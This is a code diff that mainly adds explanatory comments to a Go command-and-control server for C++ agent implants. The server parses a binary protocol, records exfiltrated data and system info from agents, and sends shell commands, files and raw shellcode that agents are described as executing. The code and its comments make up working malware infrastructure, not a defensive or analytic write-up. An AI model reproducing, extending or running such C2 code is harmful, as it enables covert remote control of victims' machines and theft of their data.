@@ -9,6 +9,19 @@ import (
 	"time"
 )
 
+/*
+handleClientConnection manages a single connected client.
+
+This goroutine runs for the lifetime of the TCP connection.
+
+Duties:
+- Continuously read incoming binary messages
+- Enforce 60-second read timeout (disconnect dead clients)
+- Parse incoming messages into InternalMessage structs
+- Forward parsed messages to processClientMessage()
+- Update LastSeen timestamp
+- Remove client and cleanup on disconnect
+*/
 func handleClientConnection(client *models.Client) {
 	defer func() {
 		client.Conn.Close()
@@ -19,7 +32,7 @@ func handleClientConnection(client *models.Client) {
 	buffer := make([]byte, 4096)
 
 	for {
-		// Set read timeout
+		// Prevent dead clients from hanging forever.
 		client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 
 		n, err := client.Conn.Read(buffer)
@@ -29,6 +42,7 @@ func handleClientConnection(client *models.Client) {
 		}
 
 		if n > 0 {
+			// Convert raw bytes → structured binary message
 			message, err := parseBinaryMessage(buffer[:n])
 			if err != nil {
 				log.Printf("Parse error from client %s: %v", client.ID, err)
@@ -41,6 +55,23 @@ func handleClientConnection(client *models.Client) {
 	}
 }
 
+/*
+parseBinaryMessage reads a raw byte buffer and constructs an InternalMessage.
+
+Message format (Little Endian):
+[0–3]   uint32 MessageType
+[4–7]   uint32 DataSize
+[8–11]  uint32 MessageID
+[12..]  Data (optional)
+
+This function:
+- Validates minimum header length
+- Extracts fields using binary.LittleEndian
+- Validates DataSize integrity
+- Copies payload bytes
+
+Returns InternalMessage or error.
+*/
 func parseBinaryMessage(data []byte) (*models.InternalMessage, error) {
 	if len(data) < 12 {
 		return nil, fmt.Errorf("message too short")
@@ -54,6 +85,7 @@ func parseBinaryMessage(data []byte) (*models.InternalMessage, error) {
 		},
 	}
 
+	// Ensure payload exists and is complete
 	if msg.Header.DataSize > 0 {
 		if len(data) < 12+int(msg.Header.DataSize) {
 			return nil, fmt.Errorf("incomplete message data")
@@ -65,8 +97,19 @@ func parseBinaryMessage(data []byte) (*models.InternalMessage, error) {
 	return msg, nil
 }
 
+/*
+processClientMessage handles ALL incoming messages from C++ clients.
+
+Responsibilities:
+- Convert raw binary message → human-readable ClientMessage
+- Route message types to correct logic (sysinfo, upload file, error report, etc.)
+- Persist messages in Client.Messages (history)
+- Execute server-side actions (save files, save exfil data)
+
+This function is the "dispatcher" for all client→server communication.
+*/
 func processClientMessage(client *models.Client, msg *models.InternalMessage) {
-	// Create message record
+	// Create readable log entry / history entry
 	clientMessage := models.ClientMessage{
 		Timestamp: time.Now(),
 		MessageID: msg.Header.MessageID,
@@ -74,6 +117,7 @@ func processClientMessage(client *models.Client, msg *models.InternalMessage) {
 		Content:   string(msg.Data),
 	}
 
+	// Route based on message type (must match C++ enums)
 	switch msg.Header.MessageType {
 	case models.MESSAGE_HANDSHAKE:
 		clientMessage.Type = "HANDSHAKE"
@@ -108,23 +152,34 @@ func processClientMessage(client *models.Client, msg *models.InternalMessage) {
 		log.Printf("Error report from client %s: %s", client.ID, string(msg.Data))
 	}
 
-	// Store the message
+	// Append to client's message history (max 100)
 	clientsMutex.Lock()
 	client.Messages = append(client.Messages, clientMessage)
-
-	// Keep only last 100 messages to prevent memory issues
 	if len(client.Messages) > 100 {
-		client.Messages = client.Messages[1:]
+		client.Messages = client.Messages[1:] // Drop oldest
 	}
 	clientsMutex.Unlock()
 }
 
+/*
+sendBinaryMessage writes a fully constructed InternalMessage
+to the client over TCP.
+
+This is the ONLY function that performs the actual network write.
+*/
 func sendBinaryMessage(client *models.Client, msg models.InternalMessage) error {
 	data := serializeBinaryMessage(msg)
 	_, err := client.Conn.Write(data)
 	return err
 }
 
+/*
+serializeBinaryMessage converts an InternalMessage struct
+into the binary protocol format expected by the client.
+
+Header = 12 bytes
+Data   = variable length
+*/
 func serializeBinaryMessage(msg models.InternalMessage) []byte {
 	data := make([]byte, 12+len(msg.Data))
 
@@ -139,6 +194,11 @@ func serializeBinaryMessage(msg models.InternalMessage) []byte {
 	return data
 }
 
+/*
+sendWelcomeMessage is automatically sent after a client handshake.
+
+Purpose: confirm protocol connection and message formatting.
+*/
 func sendWelcomeMessage(client *models.Client) {
 	welcome := models.InternalMessage{
 		Header: models.MessageHeader{
@@ -150,7 +210,20 @@ func sendWelcomeMessage(client *models.Client) {
 	sendBinaryMessage(client, welcome)
 }
 
-// Client communication functions
+//
+// ========================
+//     SERVER → CLIENT OPS
+// ========================
+//
+
+/*
+SendCommandToClient sends a MESSAGE_EXECUTE_COMMAND.
+
+This is ONLY for executing shell/console commands.
+Not used for system info or specialized requests.
+
+Data = UTF-8 command string.
+*/
 func SendCommandToClient(clientAddr string, command string) error {
 	client, exists := GetClient(clientAddr)
 	if !exists {
@@ -174,6 +247,12 @@ func SendCommandToClient(clientAddr string, command string) error {
 	return nil
 }
 
+/*
+SendFileToClient sends a binary blob that the client should store as a file.
+
+The C++ agent should interpret MESSAGE_DOWNLOAD_FILE as:
+"save this file somewhere."
+*/
 func SendFileToClient(clientAddr string, fileData []byte) error {
 	client, exists := GetClient(clientAddr)
 	if !exists {
@@ -197,6 +276,12 @@ func SendFileToClient(clientAddr string, fileData []byte) error {
 	return nil
 }
 
+/*
+SendShellcodeToClient sends raw shellcode bytes that the client
+should allocate, mark executable, and run.
+
+This is the most dangerous and powerful message type.
+*/
 func SendShellcodeToClient(clientAddr string, shellcode []byte) error {
 	client, exists := GetClient(clientAddr)
 	if !exists {
@@ -220,6 +305,11 @@ func SendShellcodeToClient(clientAddr string, shellcode []byte) error {
 	return nil
 }
 
+/*
+UpdateClientConfig sends configuration data to the client agent.
+
+The agent decides what "config" means (poll rate, directory paths, modes, etc.)
+*/
 func UpdateClientConfig(clientAddr string, config string) error {
 	client, exists := GetClient(clientAddr)
 	if !exists {
